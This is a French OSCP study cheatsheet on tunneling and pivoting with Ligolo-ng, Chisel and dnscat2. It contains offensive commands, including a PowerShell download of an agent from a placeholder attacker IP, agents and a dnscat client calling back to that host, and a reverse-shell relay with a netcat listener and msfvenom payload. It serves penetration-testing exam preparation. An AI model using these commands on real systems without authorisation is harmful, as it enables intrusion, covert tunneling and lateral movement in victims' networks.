---
title: "OSCP · Tunneling"
description: "Référence des outils de tunnel et des modes de transport réseau."
---

# OSCP · Tunneling

Référence des outils de tunnel et des modes de transport réseau.


### Tunnel simple

Configurer et comprendre les chemins de communication réseau.

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_tunnel.png)


**Paramètres et repères :**
`X.X.X.X` · `Y.Y.Y.Y` · `X.X.X.X/` · `255.255.255.0`  
`/24`  


<p class="oscp-command-note">Exemple avec l&#x27;outil ip.</p>

```bash
sudo ip tuntap add user [kali_user] mode tun ligolo

sudo ip link set ligolo up
```


<p class="oscp-command-note">Exemple avec l&#x27;outil ./ligolo_proxy_linux.</p>

```bash
# The option -selfcert is for not using a certificate (this will make our communications in clear text), we do not need to encrypt them for the exam.
./ligolo_proxy_linux -selfcert
# Autre possibilité
./ligolo_proxy_linux -selfcert -port <DIFFERENT_PROXY_PORT>
```


<p class="oscp-command-note">Exemple avec l&#x27;outil iwr.</p>

```powershell
iwr -uri http://[attacker_ip]/ligolo_agent_windows.exe -UseBasicParsing -Outfile ligolo_agent_windows.exe
```


<p class="oscp-command-note">Exemple avec l&#x27;outil ./ligolo_agent_windows.exe.</p>

```powershell
# The port is the default one, we could also change it if needed.
./ligolo_agent_windows.exe -connect [attacker_ip]:11601 -ignore-cert
# Autre possibilité
./ligolo_agent_windows.exe -connect [attacker_ip]:<DIFFERENT_PROXY_PORT> -ignore-cert
```


<p class="oscp-command-note">Exemple avec l&#x27;outil ip.</p>

```bash
# Run this command in other terminal that from the one where ligolo proxy is running
sudo ip route add [internal_submask]/24 dev ligolo

# Verify routing table
ip route list
```


<p class="oscp-command-note">Exemple technique pour la rubrique « Tunnel simple ».</p>

```bash
# Run this commands in the ligolo proxy terminal
» session
» start

# After this the tunneling should be ready, you could perform any command.
```


### Double tunnel

Configurer et comprendre les chemins de communication réseau.

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_double_tunnel.png)


<p class="oscp-command-note">Exemple avec l&#x27;outil ip.</p>

```bash
sudo ip tuntap add user [kali_user] mode tun ligolo_double

sudo ip link set ligolo_double up
```


<p class="oscp-command-note">Exemple avec l&#x27;outil listener_add.</p>

```bash
# The next step is to add a listener on port 11601 to our existing Ligolo session and redirect it to our machine. 
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# Verify it’s been added
listener_list
```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_01.png)


<p class="oscp-command-note">Exemple avec l&#x27;outil ./agent.exe.</p>

```powershell
# Next, we need to execute the agent on the Windows host to connect to the forwarded port on our attacker machine
./agent.exe -connect <IP of First Pivot Point>:11601 -ignore-cert
```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_02.png)

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_03.png)


<p class="oscp-command-note">Exemple avec l&#x27;outil ip.</p>

```bash
# Our last step is to change our session to the second pivot point (Windows), start the tunnel, and then add a route to the newly discovered network at 10.1.30.0/24.
sudo ip add route <New_Network> dev ligolo_double
```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_04.png)

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_05.png)

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_06.png)


### Local Redirection de ports

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Exemple avec l&#x27;outil ip.</p>

```bash
# Add a special hardcoded IP for local port forwarding.
sudo ip route add 240.0.0.1/32 dev ligolo
```


**Paramètres et repères :**
`240.0.0.1/32`  


<p class="oscp-command-note">Exemple avec l&#x27;outil dev.</p>

```text
dev ligolo
```


**Paramètres et repères :**
`240.0.0.1`  


<p class="oscp-command-note">Exemple technique pour la rubrique « Local Redirection de ports ».</p>

```bash
┌──(kali㉿Kali)-[~]  
└─$ nmap 240.0.0.1 -sV

PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))  
631/tcp open ipp CUPS 2.2  
3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_port_forwarding.png)


### Reverse Shells From Internal Networks


<p class="oscp-command-note">Tester ou établir une connexion réseau avec Netcat.</p>

```bash
nc -nvlp [kali_port]
```


<p class="oscp-command-note">Exemple avec l&#x27;outil listener_add.</p>

```bash
listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_10.png)


**Paramètres et repères :**
`msfvenom`  


<p class="oscp-command-note">Exemple technique pour la rubrique « Reverse Shells From Internal Networks ».</p>

```bash
[command_to_run_reverse_shell] -L [kali_ip]:[kali_port]
# Autre possibilité
./payload.exe
```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_11.png)


### Transfert de fichiers From Internal Networks

Transférer ou récupérer des fichiers dans le laboratoire.


<p class="oscp-command-note">Exemple avec l&#x27;outil listener_add.</p>

```bash
listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp
```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_07.png)


<p class="oscp-command-note">Exemple avec l&#x27;outil python3.</p>

```bash
python3 -m http.server [kali_port]
```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_08.png)


<p class="oscp-command-note">Exemple avec l&#x27;outil invoke-webrequest.</p>

```powershell
Invoke-WebRequest -Uri "http://[agent_ip]:[agent_port]/[file_name]" -OutFile [file_name]
```

![Descripción de la imagen](https://www.emmanuelsolis.com/img/ligolo_09.png)


## Chisel (HTTP Tunneling)

Examiner les entrées et les réponses de l'application web.


### Redirection de ports

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Exemple avec l&#x27;outil chisel.</p>

```bash
# In remote machine
chisel server -p <listen-port>

# In local machine
chisel client <listen-ip>:<listen-port> <local-port>:<target-ip>:<target-port>
```


### Redirection inversée de ports

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Exemple avec l&#x27;outil chisel.</p>

```bash
# In local machine
chisel server -p <LOCAL_PORT> --reverse

# In remote machine
chisel client <LOCAL_IP>:<LOCAL_PORT> R:<LOCAL_FORWARD_PORT>:<REMOTE_IP>:<REMOTE_PORT>

# Replace <LOCAL_PORT> with the port you want Chisel to listen on locally, <LOCAL_IP> with the IP address of your local machine, <LOCAL_FORWARD_PORT> with the port on your local machine to which the remote service will be forwarded, <REMOTE_IP> with the IP address of the remote machine, and <REMOTE_PORT> with the port on the remote machine.
```


<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>

```bash
curl http://localhost:<LOCAL_FORWARD_PORT>

# The result is the content from http://<REMOTE_IP>:<REMOTE_PORT>/
```


### Proxy SOCKS dynamique

Configurer et comprendre les chemins de communication réseau.


<p class="oscp-command-note">Exemple avec l&#x27;outil chisel.</p>

```bash
# In remote
chisel server -p <REMOTE_PORT> --socks5

# In local
chisel client <REMOTE_IP>:<REMOTE_PORT> <LOCAL_PORT>:socks

# Replace <REMOTE_PORT> with the port for the SOCKS proxy on the remote machine, <REMOTE_IP> with the IP address of the remote machine, and <LOCAL_PORT> with the port on your local machine where the SOCKS proxy will be available.
```


**Paramètres et repères :**
`/etc/proxychains.conf`  


<p class="oscp-command-note">Exemple avec l&#x27;outil ....</p>

```bash
# Comment out the line of "socks4"

# /etc/proxychains.conf
...
socks5 127.0.0.1 <LOCAL_PORT>
```


### Proxy SOCKS inverse

Configurer et comprendre les chemins de communication réseau.


<p class="oscp-command-note">Exemple avec l&#x27;outil chisel.</p>

```bash
# In local machine
chisel server -p <LOCAL_PORT> --reverse

# In remote machine
chisel client <LOCAL_IP>:<LOCAL_PORT> R:<REMOTE_PORT>:socks

# Replace <LOCAL_PORT> with the port you want Chisel to listen on locally, <LOCAL_IP> with the IP address of your local machine, and <REMOTE_PORT> with the port on the remote machine where the SOCKS proxy will be available.
```


**Paramètres et repères :**
`/etc/proxychains.conf`  


<p class="oscp-command-note">Exemple avec l&#x27;outil ....</p>

```bash
# /etc/proxychains.conf
...
socks5 127.0.0.1 <REMOTE_PORT>
```


<p class="oscp-command-note">Exemple avec l&#x27;outil proxychains.</p>

```bash
proxychains nmap localhost
```


## Dnscat2 (DNS Tunneling)

Interroger les enregistrements DNS et identifier les services associés.


**Paramètres et repères :**
`dnscat2`  


<p class="oscp-command-note">Exemple avec l&#x27;outil dnscat2-server.</p>

```bash
# Replace [domain] with the chosen domain
dnscat2-server [domain]
```


**Paramètres et repères :**
`dnscat2`  


<p class="oscp-command-note">Exemple avec l&#x27;outil ./dnscat.</p>

```bash
# With domain
./dnscat --secret=[secret] [domain]

# Directly to server
./dnscat --dns server=[attacker_ip],port=53 --secret=[secret]
```


**Paramètres et repères :**
`dnscat2`  


<p class="oscp-command-note">Exemple avec l&#x27;outil dnscat2.</p>

```bash
dnscat2> windows
dnscat2> window -i [session_id]
```


**Paramètres et repères :**
`dnscat2`  


<p class="oscp-command-note">Exemple avec l&#x27;outil command.</p>

```bash
command ([session_name]) > listen 127.0.0.1:[local_port] [target_ip]:[target_port]
```


**Paramètres et repères :**
`dnscat2`  


<p class="oscp-command-note">Énumérer les informations SMB ou RPC.</p>

```bash
# Example command
smbclient -p [local_port] -L //127.0.0.1 -U [username] --password=[password]
```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
